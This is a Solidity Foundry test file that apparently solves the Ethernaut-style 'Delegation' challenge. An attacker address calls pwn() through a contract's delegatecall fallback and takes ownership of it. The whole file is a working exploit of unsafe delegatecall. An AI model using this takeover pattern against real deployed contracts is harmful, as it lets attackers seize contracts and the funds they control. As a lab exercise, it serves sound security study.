// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Delegate, Delegation} from "../../src/attacks/Delegation.sol";

contract DelegationTest is Test {
    Delegate delegate;
    Delegation target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        delegate = new Delegate(address(this));
        target = new Delegation(address(delegate));
    }

    function test_exploit() public {
        vm.prank(attacker);
        (bool success, ) = address(target).call(abi.encodeWithSignature("pwn()"));
        require(success);

        assertEq(target.owner(), attacker);
        assertEq(delegate.owner(), address(this));
    }
}
